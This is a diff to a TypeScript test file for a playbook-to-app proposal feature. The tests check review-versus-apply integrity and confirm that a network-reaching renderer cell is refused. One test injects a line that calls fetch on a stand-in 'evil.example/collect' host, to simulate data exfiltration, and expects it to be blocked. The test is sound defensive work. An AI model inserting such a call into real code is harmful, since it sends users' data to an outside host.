@@ -149,6 +149,7 @@ import { buildMaterializedRecord } from "../../../services/proposals/stamp-mater
 import { creationsPlanFromRecord } from "../../proposals/revert.js";
 import { revertTargetsFromPlan } from "../../../services/proposals/revert-creations.js";
 import { safeRevert } from "../../../services/reversibility/safe-revert.js";
+import { assertPlaybookAppFileable } from "../../../services/playbook-app/propose-app-from-playbook.js";
 import {
   DEAL_LIFECYCLE,
   WIN_A_DEAL_ID,
@@ -447,6 +448,54 @@ describe("synap_propose_app_from_playbook — one proposal from the facts, appli
         { targetKind: "playbook", targetId: WIN_A_DEAL_ID, slot: "detail" },
       ],
     });
+    // WHAT RUNS, not a name: its size, the bridge reads and writes it names
+    // (all it can reach: the frame gives it no network), and its source.
+    const source = (cell as { rendererSource: string }).rendererSource;
+    expect(graph.cells?.[0]).toMatchObject({
+      sourceBytes: Buffer.byteLength(source, "utf8"),
+      bridgeOps: { reads: ["flow.of"], writes: ["update_entity"] },
+    });
+    expect(source.startsWith(graph.cells![0]!.sourceExcerpt!)).toBe(true);
+  });
+
+  it("a cell that reaches the network is refused before anything is filed", async () => {
+    const [row] = await uiProposals();
+    const ops = row!.data.operations.map((o) =>
+      o.op === "create_cell"
+        ? {
+            ...o,
+            name: "Leaky board",
+            rendererSource: `${o.rendererSource}\nfetch("https://evil.example/collect");\n`,
+          }
+        : o
+    );
+    await expect(assertPlaybookAppFileable(ops, WS)).rejects.toMatchObject({
+      code: "BAD_REQUEST",
+      message: expect.stringContaining("create_cell"),
+    });
+    // The same source reaching apply (a stored op edited after review) is
+    // refused by the cell door too: nothing lands under that name.
+    const result = await materializeCompositeGraph(
+      ops.filter((o) => o.op === "create_cell"),
+      { create: async () => ({}) },
+      { create: async () => ({}) },
+      undefined,
+      {
+        ...buildRuleLoopCallers({
+          database: h.db as never,
+          userId: USER,
+          workspaceId: WS,
+          auditSource: "rule_loop_approval",
+          skillAuthor: { agentUserId: AGENT, personApproved: true },
+        }),
+      }
+    );
+    expect(result.cells ?? []).toHaveLength(0);
+    expect(
+      (await q(`select id from widget_definitions where name = 'Leaky board'`))
+        .rows
+    ).toHaveLength(0);
+    expect(await uiProposals()).toHaveLength(1);
   });
 
   it("a second run returns the same pending proposal, never a second one", async () => {
@@ -503,7 +552,17 @@ describe("synap_propose_app_from_playbook — one proposal from the facts, appli
       [WS]
     );
     expect(cells).toHaveLength(1);
-    expect(cells[0]!.renderer_source).toContain(`"flow.of"`);
+    // No swap between review and apply: the stored source IS the source the
+    // review drew (the op's), byte for byte.
+    const reviewed = row!.data.operations.find(
+      (o) => o.op === "create_cell"
+    ) as {
+      rendererSource: string;
+    };
+    expect(cells[0]!.renderer_source).toBe(reviewed.rendererSource);
+    expect(buildProposalGraph(row!.data).cells?.[0]?.sourceBytes).toBe(
+      Buffer.byteLength(cells[0]!.renderer_source, "utf8")
+    );
     const { rows: bindings } = await q<{
       subject_kind: string;
       subject_id: string;
